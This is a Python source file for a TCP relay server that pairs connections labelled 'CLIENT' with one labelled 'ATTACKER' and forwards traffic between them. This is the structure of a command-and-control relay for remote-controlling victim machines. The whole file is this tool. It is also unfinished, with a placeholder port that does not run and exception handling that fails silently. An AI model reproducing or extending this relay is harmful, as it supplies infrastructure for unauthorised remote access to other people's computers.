import socket
import threading

HEADER = 2048
PORT = your port here
SERVER = "0.0.0.0"
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
messageA = ""
messageC = ""
attacker = []
client = []
CLIENTnum = ""
testtt = False

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)


def handle_client(conn, addr):
    global client
    global attacker
    global messageA
    global messageC
    global CLIENTnum
    global testtt
    print(f"[NEW CONNECTION] {addr} connected.")
    connected = True
    while connected:
        msg = conn.recv(HEADER).decode(FORMAT)
        if str(msg).split(":")[0] == "CLIENT":
            while True:
                if str(msg).split(":")[1] == CLIENTnum:
                    try:
                        client = conn, addr
                        client[0].send("connected".encode(FORMAT))
                        messageC = msg
                        print(f"from {client[1]}: " + msg)
                        msg = ""
                        while True:
                            msg = conn.recv(HEADER).decode(FORMAT)
                            messageC = msg
                            if messageC:
                                attacker[0].send(messageC.encode(FORMAT))
                                print(f"sent to attacker:  {messageC}")
                                messageC = ""
                    except:
                        pass
        if "ATTACKER" in msg:
            try:
                attacker = conn, addr
                messageA = msg
                CLIENTnum = msg.split(":")[1]
                print(f"from {attacker[1]}: " + msg)
                while True:
                    msg = conn.recv(HEADER).decode(FORMAT)
                    messageA = msg
                    if messageA:
                        client[0].send(messageA.encode(FORMAT))
                        print(f"sent to client:  {messageA}")
                        messageA = ""
            except:
                pass
    conn.close()


def start():
    server.listen(100)
    print(f"[LISTENING] Server is listening on {SERVER}")
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()


print("[STARTING] server is starting...")
start()
